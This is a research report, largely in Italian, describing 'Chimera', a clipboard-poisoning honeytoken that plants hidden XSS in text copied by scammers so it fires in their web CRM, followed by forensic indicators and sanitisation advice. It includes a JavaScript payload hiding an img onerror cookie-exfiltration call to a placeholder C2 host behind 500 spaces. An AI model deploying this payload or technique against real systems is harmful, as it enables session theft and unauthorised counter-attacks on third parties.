# CHIMERA PROTOCOL: Active Defense & Threat Lifecycle Report

**Date**: 2025-12-30
**Classification**: RED TEAM / RESEARCH
**Subject**: Clipboard Poisoning & Counter-Offensive Operations against Fraudulent Operators

---

## 1. Executive Summary
Il "Progetto Chimera" dimostra come un difensore può trasformare un'azione passiva (l'essere vittima di copia dati non autorizzata) in un vettore di attacco attivo. Sfruttando la fiducia dei sistemi operativi nel Clipboard e la scarsa validazione degli input nei CRM Web, il protocollo permette di eseguire codice arbitrario (XSS) sulla macchina dell'attaccante.

---

## 2. Attack Architecture (The Weapon)

### Componenti
1.  **The Trap (Honeytoken)**: Una pagina web che simula dati sensibili (OTP, PII).
2.  **The Carrier**: Il blocco appunti (Clipboard) della vittima/attaccante.
3.  **The Payload**: Codice polimorfico iniettato durante l'evento `copy`.

### Tecniche Stealth
**A. TECNICA ICEBERG (Visual Cloaking)**
Sfrutta il fatto che i campi di input HTML non vanno a capo automaticamente.
- **Logica**: `[Esca Visibile] + [500 Spazi Vuoti] + [Payload Invisibile]`
- **Effetto**: L'operatore vede solo il dato legittimo (es. "Mario Rossi"). Il codice malevolo è nascosto oltre il bordo destro del campo.

**B. MIME-TYPE OVERLOADING (Dual-Core)**
Carica payload diversi per destinazioni diverse nello stesso evento di copia.
- `text/plain` → **Iceberg Payload** (Per Web CRM / Notepad).
- `text/html` → **Table Injection** (Per Excel/Word - *Nota: Spesso mitigato da Excel moderni*).

---

## 3. Exploitation (The Kill Chain)

1.  **Weaponization**: Generazione dello script JS intercettore.
2.  **Delivery**: Lo scammer copia il dato dalla nostra pagina trappola.
3.  **Exploitation**: Lo scammer incolla nel suo CRM.
    *   Il browser renderizza l'HTML iniettato (`<img src=x onerror=...>`).
    *   L'XSS scatta immediatamente.
4.  **Action on Objectives**:
    *   Esfiltrazione dei Cookie di Sessione (`document.cookie`).
    *   Geolocalizzazione IP (`document.location`).
    *   Tracciamento al Server C2.
5.  **Self-Cleanup**: Il payload esegue `this.remove()` eliminando le tracce visive dal DOM.

### Snippet Payload (Iceberg)
```javascript
const padding = " ".repeat(500);
const payload = `"><img src=x style=display:none onerror="fetch('http://C2/exfil?c='+btoa(document.cookie));this.remove();">`;
return decoy + padding + payload;
```

---

## 4. Blue Team & Forensics (Detection)

Anche se il payload pulisce il DOM, lascia tracce indelebili sui server dell'attaccante. Un'analisi forense può rilevare l'infezione tramite tre IOC (Indicators of Compromise).

### IOC 1: The "Phantom 404"
L'uso di `<img src=x onerror=...>` costringe il browser a richiedere una risorsa inesistente ("x") per fallire e scatenare l'evento.
*   **Log Evidence** (Apache/Nginx):
    `"GET /x HTTP/1.1" 404`
*   **Significance**: Un alto volume di 404 su file chiamati "x" o caratteri singoli è un forte indicatore di scansione XSS o esecuzione payload cieca.

### IOC 2: The "Iceberg" in the Database
Il database salva l'intera stringa, inclusi i 500 spazi e il payload.
*   **Forensic Query**:
    ```sql
    SELECT id FROM leads WHERE LENGTH(field) > LENGTH(TRIM(field)) + 400;
    ```
*   **Significance**: Discrepanza massiccia tra lunghezza visiva e dimensione byte reale.

### IOC 3: Referrer Leak
Se il payload effettua chiamate esterne (fetch), i proxy aziendali registreranno connessioni anomale in uscita generate dal contesto della pagina CRM.

---

## 5. Conclusioni
La difesa contro il Protocollo Chimera richiede una sanitizzazione rigorosa degli input (`strip_tags`) lato server e client. Senza queste misure, qualsiasi operatore che copia/incolla dati da fonti esterne diventa un vettore di infezione per la propria infrastruttura (Insider Threat involontario).

**Stato Lab**: MISSIONE COMPIUTA.
